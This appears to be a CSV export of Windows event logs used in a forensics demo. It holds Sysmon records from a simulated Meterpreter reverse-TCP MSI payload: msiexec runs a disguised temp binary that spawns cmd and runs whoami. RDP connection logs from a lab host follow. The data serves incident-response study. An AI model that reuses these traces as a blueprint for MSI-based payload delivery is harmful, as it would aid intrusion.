2,10148,2019-04-30 22:48:59.2608510,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1936,1644,IEWIN7,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 1892, ProcessGUID: 365abb72-d0db-5cc8-0000-0010488a3c00","RuleName: ","SHA1=99894AEF71D9D3527F392CD71F66571110593876,MD5=209A3B1901B83AEB8527ED211CCE9E4C,SHA256=1A431F6409F8E0531F600F8F988ECECECB902DA26BBAAF1DE74A5CAC29A7CB44,IMPHASH=212B2417B4778F3EE9DE3F60458E953F",ParentProcess: C:\Windows\System32\services.exe,"ParentProcessID: 464, ParentProcessGUID: 365abb72-4321-5cc9-0000-001070530000",ParentCommandLine: C:\Windows\system32\services.exe,C:\Windows\system32\vssvc.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2019-04-30 22:48:59.151""},{""@Name"":""ProcessGuid"",""#text"":""365abb72-d0db-5cc8-0000-0010488a3c00""},{""@Name"":""ProcessId"",""#text"":""1892""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\VSSVC.exe""},{""@Name"":""FileVersion"",""#text"":""6.1.7600.16385 (win7_rtm.090713-1255)""},{""@Name"":""Description"",""#text"":""Microsoft® Volume Shadow Copy Service""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\system32\\vssvc.exe""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""365abb72-4322-5cc9-0000-0020e7030000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA1=99894AEF71D9D3527F392CD71F66571110593876,MD5=209A3B1901B83AEB8527ED211CCE9E4C,SHA256=1A431F6409F8E0531F600F8F988ECECECB902DA26BBAAF1DE74A5CAC29A7CB44,IMPHASH=212B2417B4778F3EE9DE3F60458E953F""},{""@Name"":""ParentProcessGuid"",""#text"":""365abb72-4321-5cc9-0000-001070530000""},{""@Name"":""ParentProcessId"",""#text"":""464""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\services.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\services.exe""}]}}"
3,10149,2019-04-30 22:49:08.7608510,2,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1936,1644,IEWIN7,0,S-1-5-18,A process changed a file creation time,,,"ProcessID: 2080, ProcessGUID: 365abb72-d0da-5cc8-0000-0010216f3c00","RuleName: ",Image: C:\Windows\system32\msiexec.exe,TargetFilename: C:\Windows\Installer\304d1c.msi,CreationTimeUTC: 2019-04-30 22:43:38.892,PreviousCreationTimeUTC: 2019-04-30 22:49:07.854,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2019-04-30 22:49:07.901""},{""@Name"":""ProcessGuid"",""#text"":""365abb72-d0da-5cc8-0000-0010216f3c00""},{""@Name"":""ProcessId"",""#text"":""2080""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\msiexec.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Windows\\Installer\\304d1c.msi""},{""@Name"":""CreationUtcTime"",""#text"":""2019-04-30 22:43:38.892""},{""@Name"":""PreviousCreationUtcTime"",""#text"":""2019-04-30 22:49:07.854""}]}}"
4,10150,2019-04-30 22:49:09.5421010,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1936,1644,IEWIN7,0,S-1-5-18,RegistryEvent (Value Set),,,"ProcessID: 2080, ProcessGUID: 365abb72-d0da-5cc8-0000-0010216f3c00","RuleName: ",Image: C:\Windows\system32\msiexec.exe,EventType: SetValue,TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\InProgress\(Default),Details: C:\Windows\Installer\304d1d.ipi,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2019-04-30 22:49:08.432""},{""@Name"":""ProcessGuid"",""#text"":""365abb72-d0da-5cc8-0000-0010216f3c00""},{""@Name"":""ProcessId"",""#text"":""2080""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\msiexec.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\InProgress\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Windows\\Installer\\304d1d.ipi""}]}}"
5,10151,2019-04-30 22:49:09.7608510,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1936,1644,IEWIN7,0,S-1-5-18,Process creation,IEWIN7\IEUser,,"ProcessID: 3680, ProcessGUID: 365abb72-d0e4-5cc8-0000-00103cb73e00","RuleName: ","SHA1=06B1640F88EDC6A7CE3303CB14A505A86B061616,MD5=E40CF1CC132F25719F86F0FC5870910D,SHA256=A89385CCD4BE489CD069C65DA10A0B952CB3DE9090EF4C9F02E1368392CD66C5,IMPHASH=481F47BBB2C9C21E108D65F52B04C448",ParentProcess: C:\Windows\System32\msiexec.exe,"ParentProcessID: 2080, ParentProcessGUID: 365abb72-d0da-5cc8-0000-0010216f3c00",ParentCommandLine: C:\Windows\system32\msiexec.exe /V,"""C:\Windows\Installer\MSI4FFD.tmp""",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2019-04-30 22:49:08.604""},{""@Name"":""ProcessGuid"",""#text"":""365abb72-d0e4-5cc8-0000-00103cb73e00""},{""@Name"":""ProcessId"",""#text"":""3680""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Installer\\MSI4FFD.tmp""},{""@Name"":""FileVersion"",""#text"":""2.2.14""},{""@Name"":""Description"",""#text"":""ApacheBench command line utility""},{""@Name"":""Product"",""#text"":""Apache HTTP Server""},{""@Name"":""Company"",""#text"":""Apache Software Foundation""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\Installer\\MSI4FFD.tmp\""""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""IEWIN7\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""365abb72-c494-5cc8-0000-0020e4ff0000""},{""@Name"":""LogonId"",""#text"":""0xFFE4""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""SHA1=06B1640F88EDC6A7CE3303CB14A505A86B061616,MD5=E40CF1CC132F25719F86F0FC5870910D,SHA256=A89385CCD4BE489CD069C65DA10A0B952CB3DE9090EF4C9F02E1368392CD66C5,IMPHASH=481F47BBB2C9C21E108D65F52B04C448""},{""@Name"":""ParentProcessGuid"",""#text"":""365abb72-d0da-5cc8-0000-0010216f3c00""},{""@Name"":""ParentProcessId"",""#text"":""2080""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\msiexec.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\msiexec.exe /V""}]}}"
6,10152,2019-04-30 22:49:09.7921010,7,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1936,1484,IEWIN7,0,S-1-5-18,Image loaded,,,"ProcessID: 2168, ProcessGUID: 365abb72-d0e4-5cc8-0000-001022b53e00","RuleName: ","SHA1=BCF66BE6C4D4FB0775E199C32EE2154AAC97F901,MD5=D4C89F6BCCC04D43BAC82F795A552DA5,SHA256=F7F7BF8C86CD2C6A27D20076B5713FBD60647CE0716DFEC0BB65895E92AE0830,IMPHASH=9F8EEA636265FC0065E869A2EAEFE7AF",Signed: true,Image: C:\Windows\System32\msiexec.exe,,C:\Windows\System32\vbscript.dll,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2019-04-30 22:49:08.698""},{""@Name"":""ProcessGuid"",""#text"":""365abb72-d0e4-5cc8-0000-001022b53e00""},{""@Name"":""ProcessId"",""#text"":""2168""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\msiexec.exe""},{""@Name"":""ImageLoaded"",""#text"":""C:\\Windows\\System32\\vbscript.dll""},{""@Name"":""FileVersion"",""#text"":""5.8.9600.16428""},{""@Name"":""Description"",""#text"":""Microsoft ® VBScript""},{""@Name"":""Product"",""#text"":""Microsoft ® VBScript""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""Hashes"",""#text"":""SHA1=BCF66BE6C4D4FB0775E199C32EE2154AAC97F901,MD5=D4C89F6BCCC04D43BAC82F795A552DA5,SHA256=F7F7BF8C86CD2C6A27D20076B5713FBD60647CE0716DFEC0BB65895E92AE0830,IMPHASH=9F8EEA636265FC0065E869A2EAEFE7AF""},{""@Name"":""Signed"",""#text"":""true""},{""@Name"":""Signature"",""#text"":""Microsoft Windows""},{""@Name"":""SignatureStatus"",""#text"":""Valid""}]}}"
7,10153,2019-04-30 22:49:10.1983510,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1936,1644,IEWIN7,0,S-1-5-18,Process creation,IEWIN7\IEUser,,"ProcessID: 2892, ProcessGUID: 365abb72-d0e5-5cc8-0000-0010dadf3e00","RuleName: ","SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163",ParentProcess: C:\Windows\Installer\MSI4FFD.tmp,"ParentProcessID: 3680, ParentProcessGUID: 365abb72-d0e4-5cc8-0000-00103cb73e00","ParentCommandLine: ""C:\Windows\Installer\MSI4FFD.tmp""",cmd,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2019-04-30 22:49:09.276""},{""@Name"":""ProcessGuid"",""#text"":""365abb72-d0e5-5cc8-0000-0010dadf3e00""},{""@Name"":""ProcessId"",""#text"":""2892""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""FileVersion"",""#text"":""6.1.7601.17514 (win7sp1_rtm.101119-1850)""},{""@Name"":""Description"",""#text"":""Windows Command Processor""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""CommandLine"",""#text"":""cmd""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""IEWIN7\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""365abb72-c494-5cc8-0000-0020e4ff0000""},{""@Name"":""LogonId"",""#text"":""0xFFE4""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163""},{""@Name"":""ParentProcessGuid"",""#text"":""365abb72-d0e4-5cc8-0000-00103cb73e00""},{""@Name"":""ParentProcessId"",""#text"":""3680""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\Installer\\MSI4FFD.tmp""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\Installer\\MSI4FFD.tmp\""""}]}}"
8,10154,2019-04-30 22:52:27.5889760,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1936,1644,IEWIN7,0,S-1-5-18,Process creation,IEWIN7\IEUser,,"ProcessID: 1372, ProcessGUID: 365abb72-d1ab-5cc8-0000-0010db1e4400","RuleName: ","SHA1=DC058F52AD8ACBD316827B6DCAC2434AB3CC515C,MD5=0EBF71E33EF09CA65D9683AFA999C473,SHA256=599EFD455AEEEFE2044A9B597061F271595033F5D0DF2C99DFDBCA8394BBCEC3,IMPHASH=C5352B949915AB8CD5E1844790D19274",ParentProcess: C:\Windows\System32\cmd.exe,"ParentProcessID: 2892, ParentProcessGUID: 365abb72-d0e5-5cc8-0000-0010dadf3e00",ParentCommandLine: cmd,whoami,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2019-04-30 22:52:27.588""},{""@Name"":""ProcessGuid"",""#text"":""365abb72-d1ab-5cc8-0000-0010db1e4400""},{""@Name"":""ProcessId"",""#text"":""1372""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\whoami.exe""},{""@Name"":""FileVersion"",""#text"":""6.1.7600.16385 (win7_rtm.090713-1255)""},{""@Name"":""Description"",""#text"":""whoami - displays logged on user information""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""CommandLine"",""#text"":""whoami""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""IEWIN7\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""365abb72-c494-5cc8-0000-0020e4ff0000""},{""@Name"":""LogonId"",""#text"":""0xFFE4""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""SHA1=DC058F52AD8ACBD316827B6DCAC2434AB3CC515C,MD5=0EBF71E33EF09CA65D9683AFA999C473,SHA256=599EFD455AEEEFE2044A9B597061F271595033F5D0DF2C99DFDBCA8394BBCEC3,IMPHASH=C5352B949915AB8CD5E1844790D19274""},{""@Name"":""ParentProcessGuid"",""#text"":""365abb72-d0e5-5cc8-0000-0010dadf3e00""},{""@Name"":""ParentProcessId"",""#text"":""2892""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""ParentCommandLine"",""#text"":""cmd""}]}}"
1,12551,2020-11-13 11:09:07.0840538,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1292,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,10.0.2.16:52202,Connection Type: TCP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""TCP""},{""@Name"":""ClientIP"",""#text"":""10.0.2.16:52202""}]}}"
2,12572,2020-11-13 11:09:12.4399595,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1320,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,[10.0.2.16]:59407,Connection Type: UDP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""UDP""},{""@Name"":""ClientIP"",""#text"":""[10.0.2.16]:59407""}]}}"
3,12591,2020-11-13 11:09:15.5647701,168,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,7312,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""MonitorNum"",""#text"":""0""},{""@Name"":""MonitorWidth"",""#text"":""200""},{""@Name"":""MonitorHeight"",""#text"":""200""},{""@Name"":""MonitorX"",""#text"":""0""},{""@Name"":""MonitorY"",""#text"":""0""},{""@Name"":""ServerName"",""#text"":""MSEDGEWIN10""}]}}"
4,12592,2020-11-13 11:09:15.8853010,68,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,8512,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnectionName"",""#text"":""RDP-Tcp#0""},{""@Name"":""PromptForCredentials"",""#text"":""0""},{""@Name"":""PromptForCredentialsDone"",""#text"":""0""},{""@Name"":""GfxChannelOpened"",""#text"":""8266""},{""@Name"":""FirstGraphicsReceived"",""#text"":""10672""}]}}"
5,12635,2020-11-13 11:10:04.3263752,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1292,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,10.0.2.16:52208,Connection Type: TCP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""TCP""},{""@Name"":""ClientIP"",""#text"":""10.0.2.16:52208""}]}}"
6,12656,2020-11-13 11:10:04.4159020,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1320,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,[10.0.2.16]:59409,Connection Type: UDP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""UDP""},{""@Name"":""ClientIP"",""#text"":""[10.0.2.16]:59409""}]}}"
7,12675,2020-11-13 11:10:05.5853806,168,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,7284,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""MonitorNum"",""#text"":""0""},{""@Name"":""MonitorWidth"",""#text"":""200""},{""@Name"":""MonitorHeight"",""#text"":""200""},{""@Name"":""MonitorX"",""#text"":""0""},{""@Name"":""MonitorY"",""#text"":""0""},{""@Name"":""ServerName"",""#text"":""MSEDGEWIN10""}]}}"
8,12676,2020-11-13 11:10:05.8452738,68,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,2740,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnectionName"",""#text"":""RDP-Tcp#1""},{""@Name"":""PromptForCredentials"",""#text"":""0""},{""@Name"":""PromptForCredentialsDone"",""#text"":""0""},{""@Name"":""GfxChannelOpened"",""#text"":""1015""},{""@Name"":""FirstGraphicsReceived"",""#text"":""1906""}]}}"
9,12719,2020-11-13 11:20:28.7872805,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1292,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,10.0.2.16:52276,Connection Type: TCP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""TCP""},{""@Name"":""ClientIP"",""#text"":""10.0.2.16:52276""}]}}"
10,12734,2020-11-13 11:20:38.5466910,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1292,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,10.0.2.16:52278,Connection Type: TCP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""TCP""},{""@Name"":""ClientIP"",""#text"":""10.0.2.16:52278""}]}}"
11,12755,2020-11-13 11:20:38.6713065,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1320,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,[10.0.2.16]:53248,Connection Type: UDP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""UDP""},{""@Name"":""ClientIP"",""#text"":""[10.0.2.16]:53248""}]}}"
12,12772,2020-11-13 11:20:40.9003273,168,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,7284,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""MonitorNum"",""#text"":""0""},{""@Name"":""MonitorWidth"",""#text"":""1920""},{""@Name"":""MonitorHeight"",""#text"":""1080""},{""@Name"":""MonitorX"",""#text"":""0""},{""@Name"":""MonitorY"",""#text"":""0""},{""@Name"":""ServerName"",""#text"":""MSEDGEWIN10""}]}}"
13,12774,2020-11-13 11:20:41.3012371,68,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,2456,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnectionName"",""#text"":""RDP-Tcp#3""},{""@Name"":""PromptForCredentials"",""#text"":""2578""},{""@Name"":""PromptForCredentialsDone"",""#text"":""9890""},{""@Name"":""GfxChannelOpened"",""#text"":""13484""},{""@Name"":""FirstGraphicsReceived"",""#text"":""15078""}]}}"
14,12824,2020-11-13 11:40:43.6280340,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1292,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,10.0.2.16:52725,Connection Type: TCP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""TCP""},{""@Name"":""ClientIP"",""#text"":""10.0.2.16:52725""}]}}"
15,12845,2020-11-13 11:40:43.8703953,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1320,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,[10.0.2.16]:64069,Connection Type: UDP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""UDP""},{""@Name"":""ClientIP"",""#text"":""[10.0.2.16]:64069""}]}}"
16,12864,2020-11-13 11:40:45.4180799,168,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,7284,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""MonitorNum"",""#text"":""0""},{""@Name"":""MonitorWidth"",""#text"":""200""},{""@Name"":""MonitorHeight"",""#text"":""200""},{""@Name"":""MonitorX"",""#text"":""0""},{""@Name"":""MonitorY"",""#text"":""0""},{""@Name"":""ServerName"",""#text"":""MSEDGEWIN10""}]}}"
17,12865,2020-11-13 11:40:45.5522581,68,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,8708,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnectionName"",""#text"":""RDP-Tcp#4""},{""@Name"":""PromptForCredentials"",""#text"":""0""},{""@Name"":""PromptForCredentialsDone"",""#text"":""0""},{""@Name"":""GfxChannelOpened"",""#text"":""1047""},{""@Name"":""FirstGraphicsReceived"",""#text"":""2594""}]}}"
18,12910,2020-11-13 11:41:05.1889670,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1292,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,10.0.2.16:52727,Connection Type: TCP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""TCP""},{""@Name"":""ClientIP"",""#text"":""10.0.2.16:52727""}]}}"
19,12931,2020-11-13 11:41:05.2948916,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1320,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,[10.0.2.16]:64073,Connection Type: UDP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""UDP""},{""@Name"":""ClientIP"",""#text"":""[10.0.2.16]:64073""}]}}"
20,12950,2020-11-13 11:41:05.9439505,168,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,7312,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""MonitorNum"",""#text"":""0""},{""@Name"":""MonitorWidth"",""#text"":""200""},{""@Name"":""MonitorHeight"",""#text"":""200""},{""@Name"":""MonitorX"",""#text"":""0""},{""@Name"":""MonitorY"",""#text"":""0""},{""@Name"":""ServerName"",""#text"":""MSEDGEWIN10""}]}}"
21,12952,2020-11-13 11:41:06.0608902,68,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,3224,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnectionName"",""#text"":""RDP-Tcp#5""},{""@Name"":""PromptForCredentials"",""#text"":""0""},{""@Name"":""PromptForCredentialsDone"",""#text"":""0""},{""@Name"":""GfxChannelOpened"",""#text"":""609""},{""@Name"":""FirstGraphicsReceived"",""#text"":""1265""}]}}"
